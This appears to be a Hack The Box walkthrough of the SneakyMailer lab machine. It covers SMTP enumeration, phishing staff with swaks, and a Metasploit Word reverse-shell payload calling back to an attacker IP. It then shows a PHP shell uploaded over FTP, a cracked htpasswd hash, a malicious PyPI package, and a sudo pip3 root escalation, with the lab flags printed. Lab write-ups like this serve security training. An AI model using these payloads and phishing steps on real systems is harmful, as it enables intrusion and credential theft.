@@ -1,0 +1,191 @@
+nmap -sC -sV -oN nmap 10.10.10.197 -v -A
+
+Discovered open port 80/tcp on 10.10.10.197
+port 80 seems down
+-> unknown host: sneakycorp.htb
+
+Discovered open port 8080/tcp on 10.10.10.197
+port 8080 -> nginx server 1.14.2
+
+Discovered open port 21/tcp on 10.10.10.197
+-> ftp: permission denied
+
+Discovered open port 22/tcp on 10.10.10.197
+-> ssh is open
+
+Discovered open port 25/tcp on 10.10.10.197
+-> postfix smtp
+
+Discovered open port 143/tcp on 10.10.10.197
+Discovered open port 993/tcp on 10.10.10.197
+-> imap courier imapd
+
+start by some enumeration on port 25 using `auxiliary/scanner/smtp/smtp_enum` on msf
+```
+msf5 auxiliary(scanner/smtp/smtp_enum) > exploit
+
+[*] 10.10.10.197:25       - 10.10.10.197:25 Banner: 220 debian ESMTP Postfix (Debian/GNU)
+[+] 10.10.10.197:25       - 10.10.10.197:25 Users found: , _apt, avahi-autoipd, backup, bin,
+    daemon, ftp, games, gnats, irc, list, lp, mail, man, messagebus, news, nobody, postfix,
+    postmaster, proxy, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve,
+    systemd-timesync, uucp, www-data
+[*] 10.10.10.197:25       - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+could have been done with smtp-user-enum:
+`smtp-user-enum -M VRFY -U /usr/share/wordlists/fern-wifi/common.txt -t 10.10.10.197`
+
+i come back on the site and add `10.10.10.197   sneakycorp.htb` in `/etc/hosts`
+-> site works but nothing interesting
+
+`<!-- need to add Register link to Sidebar for /pypi/register.php -->` in source code
+but seems useless
+
+team page shows avery address ends the same way: "airisatou@sneakymailer.htb"
+
+in source code we see the full messages:
+```
+<div class="text-truncate">Hello! I am the owner of the company, you are going to report to me now on</div>
+<div class="small text-gray-500">Cara Stevens · 2w</div>
+```
+and we have cara's address: carastevens@sneakymailer.htb
+
+lets try to phish this address with swaks sending an infected mail
+first lets create the payload with metasploit
+we use the word format:
+```
+> use exploit/windows/fileformat/office_word_hta
+> set SRVHOST 10.10.14.15
+> set payload generic/shell_reverse_tcp
+> set LHOST 10.10.14.15
+> run
+[*] Exploit running as background job 1.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.10.14.15:4444
+[+] msf.doc stored at /root/.msf4/local/msf.doc
+[*] Using URL: http://10.10.14.15:8080/default.hta
+[*] Server started.
+```
+
+lets send the payload to carastevens@sneakymailer.htb and start the listener on port 4444
+`swaks --to carastevens@sneakymailer.htb --server 10.10.10.197 --attach /root/.msf4/local/msf.doc`
+
+doesnt work -> lets complicate the mail
+`swaks --to sulcud@sneakymailer.htb --from it@sneakymailer.htb --header "Subject: Modules"
+--body "Here is what you asked" --server 10.10.10.197 --attach /root/.msf4/local/msf.doc`
+still no luck, lets try with all the mails
+
+cewl -n -e -w mails -v http://sneakycorp.htb/; cat mails | grep @ > mails
+
+python3 send_mails.py -> send mail to everyone in the service
+still doesnt work, let's try something simpler than a rev shell
+
+`swaks --to MAIL --from it@sneakymailer.htb --header "Subject: Modules"
+--body "http://10.10.14.15" --server 10.10.10.197`
+
+-> works!
+
+```
+listening on [any] 80 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.10.10.197] 51824
+POST / HTTP/1.1
+Host: 10.10.14.15
+User-Agent: python-requests/2.23.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Length: 185
+Content-Type: application/x-www-form-urlencoded
+
+firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
+```
+
+firstName=Paul
+lastName=Byrd
+email=paulbyrd@sneakymailer.htb
+password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
+rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
+
+lets access paul's mailbox with his creds using evolution (a mail manager)
+
+```
+Hello administrator, I want to change this password for the developer account
+
+Username: developer
+Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
+
+Please notify me when you do it
+```
+
+doesnt work for ssh
+does work for ftp access
+-> no interesting file but i see every site's files
+-> lets upload my rev shell
+`put shell.php`
+
+access http://sneakycorp.htb/shell.php and nc -lvnp 4444 -> page does not exist
+
+lets fuzz sneakycorp.htb with https://github.com/danielmiessler/SecLists
+`wfuzz -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host:FUZZ.sneakycorp.htb" -u http://10.10.10.197/ -t 50 -c --hc 400,301`
+-t = nb of cuncurrent req
+--hc = unwanted ret code
+-c = colors
+-H = header
+
+finds dev.sneakycorp.htb
+-> add it to /etc/hosts too
+
+upload shell.php again
+-> shell as www-data
+`python -c "import pty;pty.spawn('/bin/bash')"`
+`su developer` with `m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C` -> developer
+
+in /var/www/pypi.sneakycorp.htb:
+cat .htpasswd
+pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
+
+john cracks it easily
+`john --wordlist=/usr/share/wordlists/rockyou.txt pypi_hash`
+pypi:soufianeelhaoui
+
+su pypi -> doesnt work, lets visit pypi.sneakycorp.htb:80 then 8080
+8080 works
+
+i can log as pypi and upload anything to http://pypi.sneakycorp.htb/simple/ with
+`pip install --index-url http://pypi.sneakycorp.htb/simple/ PACKAGE`
+
+it means that pypi can install any python package without any verification
+lets add my ssh key to low's authorized_keys
+
+follow https://packaging.python.org/tutorials/packaging-projects/#creating-setup-py
+and https://pypi.org/project/pypiserver/#upload-with-setuptools
+-> except error to avoid rights problem
+
+import both files, set HOME to /tmp/infected_pkg then
+`python3 setup.py sdist register -r local upload -r local`
+
+can now ssh low@10.10.10.197
+
+user flag:
+983fb2d67f2c91f31ea792aca1acb7d8
+
+```
+$ sudo -l
+sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
+Matching Defaults entries for low on sneakymailer:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User low may run the following commands on sneakymailer:
+    (root) NOPASSWD: /usr/bin/pip3
+```
+
+gtfobins -> pip
+
+TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+sudo pip3 install $TF
+
+root flag:
+6953f14fd8d464ddd3e7e1cf44865207
